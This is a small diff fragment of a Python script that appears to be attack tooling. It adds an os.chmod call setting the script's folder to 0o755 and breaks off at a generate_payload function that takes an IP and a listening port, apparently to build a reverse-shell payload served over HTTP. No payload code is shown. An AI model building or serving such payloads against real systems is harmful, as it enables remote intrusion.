@@ -9,7 +9,7 @@ import os
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 
 CUR_FOLDER = Path(__file__).parent.resolve()
-
+os.chmod(CUR_FOLDER, 0o755)
 
 def generate_payload(userip: str, lport: int) -> None:
     program = """
